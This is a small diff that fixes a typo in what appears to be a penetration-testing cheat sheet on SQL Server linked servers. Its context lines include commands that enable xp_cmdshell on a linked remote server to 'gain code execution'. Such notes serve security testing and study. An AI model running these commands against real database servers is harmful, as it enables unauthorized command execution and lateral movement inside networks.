@@ -167,7 +167,7 @@ Verify who we are on the remote server remote server:
 EXEC ('select SYSTEM_USER;') AT [<remote_server>];
 ```
 
-Gain code execution on remote server  emote server:
+Gain code execution on remote server  remote server:
 
 ```bash
 EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [<remote_server>];
